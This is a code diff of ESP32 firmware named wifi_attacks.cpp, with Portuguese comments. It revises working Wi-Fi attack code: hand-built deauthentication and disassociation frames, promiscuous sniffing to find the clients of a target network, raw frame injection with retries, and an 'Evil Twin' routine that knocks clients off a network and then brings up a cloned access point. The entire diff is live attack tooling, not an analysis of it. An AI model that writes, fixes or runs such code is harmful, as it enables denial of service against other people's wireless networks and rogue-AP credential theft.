@@ -1,12 +1,12 @@
 // ============================================================
-// wifi_attacks.cpp - CORRIGIDO v5.1
+// wifi_attacks.cpp - v5.2 (ESP-IDF v4.4 compatível)
 //
 // FIXES:
-// 1. Remove MAC spoof (causava falha, nao eh necessario com bypass)
-// 2. Espera AP ficar realmente ativo antes de raw_tx
-// 3. raw_tx com retry e delay
-// 4. Modo AP puro no canal do alvo (mais simples, menos falhas)
-// 5. Deauth nativo do driver + raw_tx de reforco
+// 1. Sem MAC spoof (desnecessário com bypass funcional)
+// 2. Filtro de BSSID reforçado no promiscuous
+// 3. raw_tx com retry e log de erro
+// 4. Modo AP no canal do alvo (interface ativa)
+// 5. Evil Twin: deauth primeiro -> clone depois
 // ============================================================
 #include <WiFi.h>
 #include <esp_wifi.h>
@@ -23,29 +23,24 @@ static char     deauthTargetSSID[33] = {0};
 static uint8_t  deauthTargetAuth = 0;
 static unsigned long deauthStartTime = 0;
 
-// Frame deauth padrao
 static uint8_t deauthFrame[26] = {
-    0xc0, 0x00,             // FC: Deauthentication
-    0x3a, 0x01,             // Duration
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // DA: broadcast
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: BSSID alvo
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: BSSID alvo
-    0xf0, 0xff,             // Seq
-    0x02, 0x00              // Reason: 0x0002
-};
-
-static uint8_t disassocFrame[26] = {
-    0xa0, 0x00,             // FC: Disassociation
-    0x3a, 0x01,
+    0xc0, 0x00, 0x3a, 0x01,
     0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0xf0, 0xff,
-    0x02, 0x00
+    0xf0, 0xff, 0x02, 0x00
+};
+
+static uint8_t disassocFrame[26] = {
+    0xa0, 0x00, 0x3a, 0x01,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xf0, 0xff, 0x02, 0x00
 };
 
 // ============================================================
-// CLIENT DISCOVERY
+// CLIENT DISCOVERY - FILTRO REFORÇADO
 // ============================================================
 #define MAX_CLIENTS 16
 static uint8_t discoveredClients[MAX_CLIENTS][6];
@@ -64,24 +59,26 @@ static void getBssidFromFrame(const uint8_t *payload, uint16_t len, uint8_t *out
     const uint8_t *addr3 = &payload[16];
 
     if (frameType == 0x00) {
+        // Management: addr3 = BSSID
         memcpy(outBssid, addr3, 6);
+        // addr2 = SA (quem enviou), addr1 = DA
         if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
         else if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
     }
     else if (frameType == 0x08) {
         switch (toFromDs) {
-            case 0x00:
+            case 0x00: // IBSS
                 memcpy(outBssid, addr3, 6);
                 if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                 else if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                 break;
-            case 0x01:
-                memcpy(outBssid, addr2, 6);
-                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
+            case 0x01: // To DS (STA -> AP)
+                memcpy(outBssid, addr1, 6); // addr1 = BSSID
+                if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2; // addr2 = STA
                 break;
-            case 0x02:
-                memcpy(outBssid, addr1, 6);
-                if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
+            case 0x02: // From DS (AP -> STA)
+                memcpy(outBssid, addr2, 6); // addr2 = BSSID
+                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1; // addr1 = STA
                 break;
         }
     }
@@ -89,18 +86,30 @@ static void getBssidFromFrame(const uint8_t *payload, uint16_t len, uint8_t *out
 
 static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (type == WIFI_PKT_MISC) return;
+
     const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
     const uint8_t *payload = pkt->payload;
     uint16_t len = pkt->rx_ctrl.sig_len;
+
+    // Só processa Management e Data frames
+    uint8_t frameType = payload[0] & 0x0C;
+    if (frameType != 0x00 && frameType != 0x08) return;
+
+    // Só processa frames com FCS OK
+    if (pkt->rx_ctrl.rx_state != 0) return;
 
     uint8_t frameBssid[6];
     const uint8_t *clientMac = nullptr;
     getBssidFromFrame(payload, len, frameBssid, &clientMac);
 
+    // Filtra pelo BSSID do alvo
     if (memcmp(frameBssid, deauthTargetBSSID, 6) != 0) return;
+    // Ignora broadcast BSSID
+    if (frameBssid[0] == 0xFF) return;
     if (!clientMac) return;
-    if (clientMac[0] & 0x01) return;
+    if (clientMac[0] & 0x01) return; // multicast
 
+    // Verifica se já descobrimos
     for (int i = 0; i < clientCount; i++) {
         if (memcmp(discoveredClients[i], clientMac, 6) == 0) return;
     }
@@ -136,10 +145,9 @@ static void stopPromiscuous() {
 }
 
 // ============================================================
-// RAW FRAME com retry
+// RAW FRAME
 // ============================================================
 static bool raw_tx(const uint8_t* frame, size_t len) {
-    // Retry ate 3x com delay
     for (int retry = 0; retry < 3; retry++) {
         esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, true);
         if (err == ESP_OK) {
@@ -148,9 +156,14 @@ static bool raw_tx(const uint8_t* frame, size_t len) {
             return true;
         }
         if (err == ESP_ERR_INVALID_STATE) {
-            delay(10); // AP ainda nao esta pronto
+            delay(10);
         } else {
-            break; // outro erro, nao adianta retry
+            static unsigned long lastErrLog = 0;
+            if (millis() - lastErrLog > 3000) {
+                lastErrLog = millis();
+                Serial.printf("[raw_tx] ERR %d (0x%x)\n", err, err);
+            }
+            break;
         }
     }
     return false;
@@ -234,7 +247,7 @@ NetworkInfo* getNetwork(uint8_t index) {
 }
 
 // ============================================================
-// DEAUTH - Simplificado, sem MAC spoof, com wait pro AP
+// DEAUTH
 // ============================================================
 void startDeauth(uint8_t networkIndex) {
     if (networkIndex >= networkCount) {
@@ -261,52 +274,21 @@ void startDeauth(uint8_t networkIndex) {
 
     buildDeauthBroadcast();
 
-    // === PASSO 1: Desliga WiFi ===
     WiFi.disconnect(true);
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_OFF);
     delay(500);
 
-    // === PASSO 2: Modo AP puro no canal do alvo ===
     WiFi.mode(WIFI_AP);
     delay(300);
 
-    // === PASSO 3: Sobe AP no canal do alvo ===
     bool apOk = WiFi.softAP("_", "", target->channel, 1, 0);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
     esp_wifi_set_ps(WIFI_PS_NONE);
-
-    // === PASSO 4: ESPERA AP FICAR PRONTO ===
-    // O softAP eh assincrono. Precisamos esperar a interface ficar ativa.
-    Serial.print("[Deauth] Waiting AP ready");
-    int waitCount = 0;
-    while (waitCount < 50) { // max 5 segundos
-        wifi_mode_t mode;
-        esp_wifi_get_mode(&mode);
-        if (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) {
-            // Tenta um ping no raw_tx para ver se a interface responde
-            uint8_t testFrame[26];
-            memcpy(testFrame, deauthFrame, 26);
-            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, testFrame, 26, true);
-            if (err == ESP_OK) {
-                Serial.println(" OK");
-                break;
-            }
-        }
-        Serial.print(".");
-        delay(100);
-        waitCount++;
-    }
-    if (waitCount >= 50) {
-        Serial.println(" TIMEOUT");
-    }
-
-    // Garante canal
     esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
 
     Serial.printf("[Deauth] AP on CH%d (softAP: %s)\n", target->channel, apOk ? "OK" : "FAIL");
 
-    // Descobrir clientes
     startPromiscuous();
 
     deauthActive = true;
@@ -392,7 +374,6 @@ void startEvilTwin(uint8_t networkIndex) {
 
     NetworkInfo* target = &scannedNetworks[networkIndex];
 
-    // FASE 1: Deauth puro
     Serial.println("[EvilTwin] Phase 1: Deauth...");
     startDeauth(networkIndex);
 
@@ -402,7 +383,6 @@ void startEvilTwin(uint8_t networkIndex) {
         delay(1);
     }
 
-    // FASE 2: Para deauth, sobe clone
     Serial.println("[EvilTwin] Phase 2: Clone AP...");
     stopPromiscuous();
 
